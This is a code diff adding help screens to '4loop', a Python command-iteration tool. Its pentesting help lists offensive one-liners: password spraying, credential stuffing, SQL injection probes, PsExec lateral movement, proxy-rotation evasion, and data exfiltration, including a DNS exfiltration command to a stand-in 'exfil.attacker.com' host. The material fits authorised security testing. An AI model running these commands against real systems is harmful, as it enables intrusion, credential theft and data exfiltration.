@@ -2,6 +2,481 @@
 import sys, os, time, re
 from itertools import cycle
 
+# ANSI color codes for terminal output
+class Colors:
+    CYAN = '\033[96m'
+    YELLOW = '\033[93m'
+    GREEN = '\033[92m'
+    RED = '\033[91m'
+    GRAY = '\033[90m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+    RESET = '\033[0m'
+    
+    @staticmethod
+    def is_supported():
+        return hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
+    
+    @classmethod
+    def cmd(cls, text):
+        return f"{cls.CYAN}{text}{cls.RESET}" if cls.is_supported() else text
+    
+    @classmethod
+    def var(cls, text):
+        return f"{cls.YELLOW}{text}{cls.RESET}" if cls.is_supported() else text
+    
+    @classmethod
+    def output(cls, text):
+        return f"{cls.GRAY}{text}{cls.RESET}" if cls.is_supported() else text
+    
+    @classmethod
+    def success(cls, text):
+        return f"{cls.GREEN}{text}{cls.RESET}" if cls.is_supported() else text
+    
+    @classmethod
+    def error(cls, text):
+        return f"{cls.RED}{text}{cls.RESET}" if cls.is_supported() else text
+    
+    @classmethod
+    def bold(cls, text):
+        return f"{cls.BOLD}{text}{cls.RESET}" if cls.is_supported() else text
+    
+    @classmethod
+    def dim(cls, text):
+        return f"{cls.DIM}{text}{cls.RESET}" if cls.is_supported() else text
+
+def show_help():
+    """Show concise help menu."""
+    c = Colors
+    print(f"""
+{c.bold('4loop')} - Execute commands in powerful iteration patterns
+
+{c.bold('QUICK START')}
+  {c.cmd('echo "hello world" > test.txt')}              {c.dim('# Create test file')}
+  {c.cmd('4loop \'echo "Processing: LINE"\' test.txt')}  {c.dim('# Process each line')}
+  {c.output('→ Processing: hello world')}
+
+{c.bold('USAGE')}
+  4loop {c.var('[mode]')} {c.var('\'command\'')} {c.var('input1')} {c.var('[input2]')} {c.var('[timeout]')}
+  
+  {c.var('mode')}:     -z (zip pairs), -c (cycle shorter list)
+  {c.var('command')}: Use LINE, LINE1, or LINE2 for substitution
+  {c.var('input')}:   File path, number (iterations), or INPUT (stdin)
+  {c.var('timeout')}: Delay between iterations (e.g., 2s, 500ms)
+
+{c.bold('COMMON PATTERNS')}
+  {c.dim('# Iterate over file lines')}
+  {c.cmd('4loop \'nmap -sV LINE\' hosts.txt')}
+  
+  {c.dim('# Repeat command N times')}
+  {c.cmd('4loop \'curl http://api.test/health\' 5 2s')}
+  
+  {c.dim('# Process piped input')}
+  {c.cmd('seq 1 10 | 4loop \'echo "Processing item LINE"\' INPUT')}
+  
+  {c.dim('# Test all combinations (default: cartesian product)')}
+  {c.cmd('4loop \'curl LINE1:LINE2\' servers.txt ports.txt')}
+  
+  {c.dim('# Pair specific items (zip mode)')}
+  {c.cmd('4loop -z \'adduser LINE1 --password LINE2\' users.txt passwords.txt')}
+  
+  {c.dim('# Distribute work (cycle mode)')}
+  {c.cmd('4loop -c \'scp LINE1 LINE2:/backup/\' files.txt servers.txt')}
+
+{c.bold('EXAMPLES WITH OUTPUT')}
+  {c.cmd('$ echo -e "alice\\nbob" > users.txt')}
+  {c.cmd('$ echo -e "80\\n443" > ports.txt')}
+  {c.cmd('$ 4loop \'echo "LINE1:LINE2"\' users.txt ports.txt')}
+  {c.output('alice:80')}
+  {c.output('alice:443')}
+  {c.output('bob:80')}
+  {c.output('bob:443')}
+  
+  {c.cmd('$ 4loop -z \'echo "LINE1→LINE2"\' users.txt ports.txt')}
+  {c.output('alice→80')}
+  {c.output('bob→443')}
+
+{c.bold('TIMEOUT EXAMPLES')}
+  {c.cmd('4loop \'ping -c 1 LINE\' hosts.txt 2s')}     {c.dim('# 2 second delay')}
+  {c.cmd('4loop \'echo "test"\' 10 500ms')}           {c.dim('# 500ms between each')}
+  {c.cmd('4loop \'curl LINE\' urls.txt 0')}           {c.dim('# No delay')}
+
+{c.bold('NEED MORE?')}
+  {c.cmd('4loop --help-examples')}    {c.dim('# Extensive real-world examples')}
+  {c.cmd('4loop --help-modes')}       {c.dim('# Detailed mode explanations')}  
+  {c.cmd('4loop --help-pentesting')}  {c.dim('# Security testing patterns')}
+  
+{c.dim('GitHub: https://github.com/wyatt727/4loop')}
+""")
+
+def show_examples_help():
+    """Show extensive examples."""
+    c = Colors
+    print(f"""
+{c.bold('4loop - EXTENSIVE EXAMPLES')}
+
+{c.bold('═══ BASIC OPERATIONS ═══')}
+
+{c.bold('File Processing')}
+  {c.dim('# Process each line of a file')}
+  {c.cmd('4loop \'echo "Processing: LINE"\' data.txt')}
+  
+  {c.dim('# Count lines while processing')}
+  {c.cmd('4loop \'wc -l LINE\' *.txt')}
+  
+  {c.dim('# Validate URLs from a list')}
+  {c.cmd('4loop \'curl -I LINE | head -1\' urls.txt 1s')}
+
+{c.bold('Simple Repetition')}
+  {c.dim('# Retry a command 5 times')}
+  {c.cmd('4loop \'curl http://flaky-api.com/status\' 5 3s')}
+  
+  {c.dim('# Generate test files')}
+  {c.cmd('4loop \'touch test_file_$RANDOM.txt\' 10')}
+  
+  {c.dim('# Stress test an endpoint')}
+  {c.cmd('4loop \'ab -n 100 -c 10 http://localhost:8080/\' 10 5s')}
+
+{c.bold('Piped Input')}
+  {c.dim('# Process command output')}
+  {c.cmd('ls *.log | 4loop \'gzip LINE\' INPUT')}
+  
+  {c.dim('# Chain with other tools')}
+  {c.cmd('find . -name "*.py" | 4loop \'pylint LINE\' INPUT 0.5s')}
+  
+  {c.dim('# Generate sequences')}
+  {c.cmd('seq 1 100 | 4loop \'curl -d "id=LINE" http://api.test\' INPUT')}
+
+{c.bold('═══ TWO-FILE OPERATIONS ═══')}
+
+{c.bold('Cartesian Product (Default)')}
+  {c.dim('# Test all server:port combinations')}
+  {c.cmd('4loop \'nc -zv LINE1 LINE2\' servers.txt ports.txt 0.5s')}
+  
+  {c.dim('# Generate all subdomain combinations')}
+  {c.cmd('4loop \'dig LINE1.LINE2\' subdomains.txt domains.txt')}
+  
+  {c.dim('# Cross-test parameters')}
+  {c.cmd('4loop \'./test --mode=LINE1 --threads=LINE2\' modes.txt threads.txt')}
+
+{c.bold('Zip Mode - Parallel Processing (-z)')}
+  {c.dim('# Map specific users to passwords')}
+  {c.cmd('4loop -z \'sshpass -p LINE2 ssh LINE1@server\' users.txt passwords.txt')}
+  
+  {c.dim('# Process paired data')}
+  {c.cmd('4loop -z \'mv LINE1 LINE2\' old_names.txt new_names.txt')}
+  
+  {c.dim('# Assign IPs to hostnames')}
+  {c.cmd('4loop -z \'echo "LINE1 LINE2" >> /etc/hosts\' ips.txt hostnames.txt')}
+
+{c.bold('Cycle Mode - Load Distribution (-c)')}
+  {c.dim('# Distribute files across servers (round-robin)')}
+  {c.cmd('4loop -c \'scp LINE1 LINE2:/data/\' large_files.txt servers.txt')}
+  
+  {c.dim('# Rotate through proxy list')}
+  {c.cmd('4loop -c \'curl --proxy LINE2 LINE1\' urls.txt proxies.txt')}
+  
+  {c.dim('# Balance work across workers')}
+  {c.cmd('4loop -c \'ssh LINE2 "process_task LINE1"\' tasks.txt workers.txt')}
+
+{c.bold('═══ ADVANCED PATTERNS ═══')}
+
+{c.bold('Network Operations')}
+  {c.cmd('# Port scan with retry')}
+  {c.cmd('4loop \'nmap -p LINE2 LINE1 || nmap -p LINE2 LINE1\' hosts.txt ports.txt 2s')}
+  
+  {c.cmd('# DNS enumeration')}
+  {c.cmd('4loop \'host LINE1.target.com LINE2\' subdomains.txt dns_servers.txt')}
+  
+  {c.cmd('# Service discovery')}
+  {c.cmd('4loop \'curl -X POST LINE1:LINE2/api/v1/status\' hosts.txt ports.txt')}
+
+{c.bold('Data Processing')}
+  {c.cmd('# Batch image conversion')}
+  {c.cmd('ls *.png | 4loop \'convert LINE -quality 85 compressed/LINE\' INPUT')}
+  
+  {c.cmd('# Database operations')}
+  {c.cmd('4loop \'mysql -e "INSERT INTO logs VALUES (LINE)"\' data.csv')}
+  
+  {c.cmd('# Log analysis')}
+  {c.cmd('4loop \'grep ERROR LINE | wc -l\' /var/log/*.log')}
+
+{c.bold('Automation Chains')}
+  {c.cmd('# Multi-stage processing')}
+  {c.cmd('4loop \'wget LINE -O temp && process temp && rm temp\' urls.txt 5s')}
+  
+  {c.cmd('# Conditional execution')}
+  {c.cmd('4loop \'ping -c 1 LINE && ssh LINE "uptime"\' hosts.txt')}
+  
+  {c.cmd('# Error handling')}
+  {c.cmd('4loop \'curl LINE || echo "LINE failed" >> errors.log\' apis.txt')}
+
+{c.bold('═══ TROUBLESHOOTING ═══')}
+
+{c.error('✗ Common Mistake:')} Using LINE without data
+  {c.cmd('4loop \'echo LINE\' 5')}  {c.error('← Error: LINE needs actual data')}
+  {c.success('✓ Fix:')} {c.cmd('seq 1 5 | 4loop \'echo LINE\' INPUT')}
+
+{c.error('✗ Common Mistake:')} Ambiguous timeout
+  {c.cmd('4loop \'echo test\' 3 3')}  {c.dim('← Is second 3 timeout or input?')}
+  {c.success('✓ Fix:')} {c.cmd('4loop \'echo test\' 3 3s')}  {c.dim('← Explicit 3 second timeout')}
+
+{c.error('✗ Common Mistake:')} Wrong mode for use case
+  {c.cmd('4loop \'test LINE1:LINE2\' users.txt passwords.txt')}  {c.dim('← Tests all combinations')}
+  {c.success('✓ Fix:')} {c.cmd('4loop -z \'test LINE1:LINE2\' users.txt passwords.txt')}  {c.dim('← Pairs only')}
+
+{c.dim('For more: https://github.com/wyatt727/4loop')}
+""")
+
+def show_modes_help():
+    """Show detailed mode explanations."""
+    c = Colors
+    print(f"""
+{c.bold('4loop - ITERATION MODES EXPLAINED')}
+
+{c.bold('═══ DEFAULT: CARTESIAN PRODUCT ═══')}
+
+Combines {c.bold('every')} item from input1 with {c.bold('every')} item from input2.
+
+{c.dim('Visual Example:')}
+  input1: [A, B]     {c.bold('╱├─→')} A:1
+  input2: [1, 2, 3]  {c.bold('╱ ├─→')} A:2
+                    {c.bold('╱  └─→')} A:3
+                   {c.bold('╱')}
+                  {c.bold('╱')}    {c.bold('╱├─→')} B:1
+                 {c.bold('×────╱ ├─→')} B:2
+                        {c.bold('└─→')} B:3
+
+{c.cmd('4loop \'echo "LINE1:LINE2"\' file1 file2')}
+
+{c.bold('Use Cases:')}
+  • Password spraying (all users × one password)
+  • Subdomain enumeration (all prefixes × all domains)  
+  • Parameter fuzzing (all values × all parameters)
+  • Complete coverage testing
+
+{c.bold('Real Example:')}
+  {c.cmd('$ echo -e "admin\\nroot" > users.txt')}
+  {c.cmd('$ echo -e "22\\n80\\n443" > ports.txt')}
+  {c.cmd('$ 4loop \'nc -zv LINE1 LINE2\' users.txt ports.txt')}
+  {c.output('→ Tests: admin:22, admin:80, admin:443, root:22, root:80, root:443')}
+  {c.dim('Total: 2 × 3 = 6 operations')}
+
+{c.bold('═══ ZIP MODE (-z): PARALLEL PAIRING ═══')}
+
+Pairs items by position: 1st with 1st, 2nd with 2nd, etc.
+Stops when the {c.bold('shortest')} file ends.
+
+{c.dim('Visual Example:')}
+  input1: [A, B, C]   A {c.bold('───→')} 1
+  input2: [1, 2]      B {c.bold('───→')} 2
+                      C {c.error('✗')}  {c.dim('(no pair, stopped)')}
+
+{c.cmd('4loop -z \'echo "LINE1→LINE2"\' file1 file2')}
+
+{c.bold('Use Cases:')}
+  • Credential pairs (specific user:password combinations)
+  • Data migration (old_name → new_name)
+  • 1:1 mappings (IP → hostname)
+  • Paired test data
+
+{c.bold('Real Example:')}
+  {c.cmd('$ echo -e "file1.txt\\nfile2.txt\\nfile3.txt" > sources.txt')}
+  {c.cmd('$ echo -e "backup1\\nbackup2" > destinations.txt')}
+  {c.cmd('$ 4loop -z \'cp LINE1 LINE2/\' sources.txt destinations.txt')}
+  {c.output('→ Copies: file1.txt→backup1/, file2.txt→backup2/')}
+  {c.dim('file3.txt is skipped (no destination)')}
+
+{c.bold('═══ CYCLE MODE (-c): ROUND-ROBIN DISTRIBUTION ═══')}
+
+The shorter list {c.bold('repeats')} to match the longer list's length.
+
+{c.dim('Visual Example:')}
+  input1: [A, B, C, D, E]   A {c.bold('───→')} 1
+  input2: [1, 2]            B {c.bold('───→')} 2
+                            C {c.bold('───→')} 1 {c.dim('(cycles back)')}
+                            D {c.bold('───→')} 2
+                            E {c.bold('───→')} 1
+
+{c.cmd('4loop -c \'echo "LINE1→LINE2"\' file1 file2')}
+
+{c.bold('Use Cases:')}
+  • Load balancing (distribute across servers)
+  • Proxy rotation (cycle through proxy list)
+  • Worker distribution (assign tasks round-robin)
+  • Resource pooling
+
+{c.bold('Real Example:')}
+  {c.cmd('$ echo -e "task1\\ntask2\\ntask3\\ntask4\\ntask5" > tasks.txt')}
+  {c.cmd('$ echo -e "worker1\\nworker2" > workers.txt')}
+  {c.cmd('$ 4loop -c \'ssh LINE2 "process LINE1"\' tasks.txt workers.txt')}
+  {c.output('→ Assigns: task1→worker1, task2→worker2, task3→worker1, ...')}
+  {c.dim('Perfect distribution: worker1 gets 3 tasks, worker2 gets 2')}
+
+{c.bold('═══ MODE SELECTION GUIDE ═══')}
+
+{c.bold('Question')}                                  {c.bold('Mode to Use')}
+─────────────────────────────────────────────────────────
+Need all combinations?                    → Default (cartesian)
+Have paired/related data?                 → {c.cmd('-z')} (zip)
+Need to distribute/rotate?                → {c.cmd('-c')} (cycle)
+Testing every user with every password?   → Default
+Testing specific credentials?              → {c.cmd('-z')}
+Spreading load across servers?            → {c.cmd('-c')}
+
+{c.bold('QUICK REFERENCE')}
+  {c.dim('Files:')} A,B,C  ×  1,2  =
+    {c.dim('Default:')} A1,A2,B1,B2,C1,C2  {c.dim('(6 operations)')}
+    {c.dim('Zip -z:')}  A1,B2              {c.dim('(2 operations)')}
+    {c.dim('Cycle -c:')} A1,B2,C1           {c.dim('(3 operations)')}
+
+{c.dim('For more: https://github.com/wyatt727/4loop')}
+""")
+
+def show_pentesting_help():
+    """Show pentesting-specific examples."""
+    c = Colors
+    print(f"""
+{c.bold('4loop - PENTESTING & SECURITY PATTERNS')}
+
+{c.bold('═══ RECONNAISSANCE ═══')}
+
+{c.bold('Subdomain Enumeration')}
+  {c.dim('# Check multiple subdomain lists against multiple domains')}
+  {c.cmd('4loop \'dig +short LINE1.LINE2\' subdomains.txt domains.txt | grep -v "^$"')}
+  
+  {c.dim('# Verify subdomains with specific DNS servers')}
+  {c.cmd('4loop -c \'dig @LINE2 LINE1.target.com +short\' subdomains.txt dns_servers.txt')}
+  
+  {c.dim('# HTTPS certificate checking')}
+  {c.cmd('4loop \'echo | openssl s_client -connect LINE:443 2>/dev/null | grep subject\' domains.txt')}
+
+{c.bold('Port Scanning')}
+  {c.dim('# Distributed scanning across jump hosts')}
+  {c.cmd('4loop -c \'ssh LINE2 "nmap -sS -p- LINE1"\' targets.txt jumphosts.txt 2s')}
+  
+  {c.dim('# Targeted service discovery')}
+  {c.cmd('4loop \'nc -zv LINE1 LINE2 2>&1 | grep succeeded\' hosts.txt ports.txt 0.2s')}
+  
+  {c.dim('# Banner grabbing')}
+  {c.cmd('4loop \'echo -e "HEAD / HTTP/1.0\\n\\n" | nc -w 1 LINE 80\' webservers.txt')}
+
+{c.bold('═══ AUTHENTICATION ATTACKS ═══')}
+
+{c.bold('Password Spraying')}
+  {c.dim('# Single password against all users (avoid lockouts)')}
+  {c.cmd('4loop \'crackmapexec smb target.com -u LINE -p Winter2024!\' users.txt 5s')}
+  
+  {c.dim('# Spray across multiple targets')}
+  {c.cmd('4loop \'hydra -l admin -p LINE1 LINE2 ssh\' passwords.txt targets.txt 2s')}
+  
+  {c.dim('# Time-delayed spraying to avoid detection')}
+  {c.cmd('4loop \'smbclient -L //LINE -U guest%password 2>/dev/null\' targets.txt 30s')}
+
+{c.bold('Credential Stuffing')}
+  {c.dim('# Test specific credential pairs')}
+  {c.cmd('4loop -z \'hydra -l LINE1 -p LINE2 ftp://target.com\' users.txt passwords.txt 1s')}
+  
+  {c.dim('# With proxy rotation')}
+  {c.cmd('4loop -z \'curl --proxy LINE2 -d "user=LINE1&pass=LINE1" https://target/login\' creds.txt proxies.txt')}
+  
+  {c.dim('# NTLM authentication testing')}
+  {c.cmd('4loop -z \'curl --ntlm -u "LINE1:LINE2" http://sharepoint.local\' users.txt passwords.txt')}
+
+{c.bold('═══ WEB APPLICATION TESTING ═══')}
+
+{c.bold('Directory/File Fuzzing')}
+  {c.dim('# Directory brute-force with status checking')}
+  {c.cmd('4loop \'curl -s -o /dev/null -w "%{http_code}" http://target.com/LINE\' dirs.txt | grep -v 404')}
+  
+  {c.dim('# Extension fuzzing')}
+  {c.cmd('4loop \'curl -I http://target.com/admin.LINE\' extensions.txt 0.5s')}
+  
+  {c.dim('# Backup file discovery')}
+  {c.cmd('4loop \'curl -I http://target.com/LINE{~,.bak,.old,.swp}\' pages.txt')}
+
+{c.bold('Parameter Fuzzing')}
+  {c.dim('# GET parameter discovery')}
+  {c.cmd('4loop \'curl "http://api.target.com/endpoint?LINE=test"\' params.txt | grep -v "Unknown parameter"')}
+  
+  {c.dim('# POST data fuzzing')}
+  {c.cmd('4loop \'curl -X POST -d "LINE" http://target.com/api\' payloads.txt 0.5s')}
+  
+  {c.dim('# Header injection testing')}
+  {c.cmd('4loop \'curl -H "LINE: ../../etc/passwd" http://target.com\' headers.txt')}
+
+{c.bold('SQL Injection')}
+  {c.dim('# Time-based blind SQLi testing')}
+  {c.cmd('4loop \'curl "http://target.com/page?id=1 AND SLEEP(5)--LINE"\' sqli_payloads.txt 10s')}
+  
+  {c.dim('# Error-based SQLi')}
+  {c.cmd('4loop \'curl "http://target.com/search?q=LINE" | grep -i "sql\\|error\\|warning"\' sqli_tests.txt')}
+
+{c.bold('═══ POST-EXPLOITATION ═══')}
+
+{c.bold('Lateral Movement')}
+  {c.dim('# Check accessible shares')}
+  {c.cmd('4loop \'smbclient -L //LINE -N 2>/dev/null | grep Disk\' internal_hosts.txt')}
+  
+  {c.dim('# SSH key reuse')}
+  {c.cmd('4loop \'ssh -o BatchMode=yes -i private_key LINE "hostname"\' discovered_hosts.txt 2s')}
+  
+  {c.dim('# PSExec across network')}
+  {c.cmd('4loop \'impacket-psexec admin:password@LINE\' windows_hosts.txt')}
+
+{c.bold('Data Exfiltration')}
+  {c.dim('# Distribute exfil across multiple channels')}
+  {c.cmd('4loop -c \'curl -X POST -F "file=@LINE1" https://LINE2/upload\' files.txt exfil_servers.txt 5s')}
+  
+  {c.dim('# DNS exfiltration')}
+  {c.cmd('4loop \'dig $(base64 LINE | tr -d "\\n").exfil.attacker.com\' sensitive_data.txt 2s')}
+
+{c.bold('═══ DEFENSIVE TESTING ═══')}
+
+{c.bold('Security Monitoring')}
+  {c.dim('# Test detection rules')}
+  {c.cmd('4loop \'curl -A "LINE" http://honeypot.local\' malicious_user_agents.txt 10s')}
+  
+  {c.dim('# Verify firewall rules')}
+  {c.cmd('4loop \'nc -zv protected.host LINE 2>&1\' blocked_ports.txt | grep -v succeeded')}
+  
+  {c.dim('# IDS/IPS testing')}
+  {c.cmd('4loop \'curl "http://waf.test/PAGE?test=LINE"\' ids_test_payloads.txt 5s')}
+
+{c.bold('═══ USEFUL COMBINATIONS ═══')}
+
+{c.bold('Chain Multiple Stages')}
+  {c.cmd('# Stage 1: Find live hosts')}
+  {c.cmd('4loop \'ping -c 1 LINE && echo LINE >> live.txt\' ip_range.txt')}
+  
+  {c.cmd('# Stage 2: Port scan live hosts')}
+  {c.cmd('4loop \'nmap -sS -p 1-1000 LINE\' live.txt 2s')}
+  
+  {c.cmd('# Stage 3: Service enumeration')}
+  {c.cmd('4loop \'nmap -sV -p LINE2 LINE1\' live.txt open_ports.txt')}
+
+{c.bold('Proxy Rotation Pattern')}
+  {c.cmd('# Rotate through SOCKS proxies for anonymity')}
+  {c.cmd('4loop -c \'proxychains4 -f LINE2 nmap -sT LINE1\' targets.txt proxy_configs.txt 10s')}
+
+{c.bold('Time-Based Evasion')}
+  {c.cmd('# Random delays between 5-15 seconds')}
+  {c.cmd('4loop \'curl LINE && sleep $((RANDOM % 10 + 5))\' urls.txt')}
+
+{c.bold('Error Recovery')}
+  {c.cmd('# Retry failed attempts')}
+  {c.cmd('4loop \'curl LINE || (sleep 5 && curl LINE)\' unreliable_apis.txt')}
+
+{c.bold('OPSEC TIPS')}
+  • Use {c.cmd('30s+')} delays for password spraying to avoid lockouts
+  • Rotate through {c.cmd('-c')} proxy lists to distribute source IPs
+  • Add jitter with {c.cmd('sleep $((RANDOM % 10))')} for timing variance
+  • Log everything: append {c.cmd('| tee -a operation.log')}
+  • Test detection: run against your own honeypots first
+
+{c.dim('For more: https://github.com/wyatt727/4loop')}
+""")
+
 def parse_input(source):
     """Parse an input source into a list of lines. Returns (data, is_numeric)."""
     if source == "INPUT":
@@ -63,17 +538,22 @@ def replace_vars(cmd, values):
 def main():
     args = sys.argv[1:]
     
+    # Handle help flags
+    if not args or args[0] in ['-h', '--help']:
+        show_help()
+        sys.exit(0)
+    elif args[0] == '--help-examples':
+        show_examples_help()
+        sys.exit(0)
+    elif args[0] == '--help-modes':
+        show_modes_help()
+        sys.exit(0)
+    elif args[0] == '--help-pentesting':
+        show_pentesting_help()
+        sys.exit(0)
+    
     if len(args) < 2:
-        print("Usage: 4loop [-z|-c] '[command]' [input1] [input2] [timeout]")
-        print("  -z: Zip mode (pair lines 1:1, stop at shortest)")
-        print("  -c: Cycle mode (repeat shorter file to match longer)")
-        print("  default: Cartesian product (all combinations)")
-        print("\nTimeout can use suffixes: 3s (seconds), 500ms (milliseconds)")
-        print("\nExamples:")
-        print("  4loop 'echo LINE' file.txt")
-        print("  4loop 'echo hello' 5 3s          # 5 iterations, 3 second timeout")
-        print("  4loop 'curl LINE1:LINE2' hosts.txt ports.txt 500ms")
-        print("  seq 1 5 | 4loop 'echo LINE' INPUT 2s")
+        show_help()
         sys.exit(1)
     
     # Parse mode flag
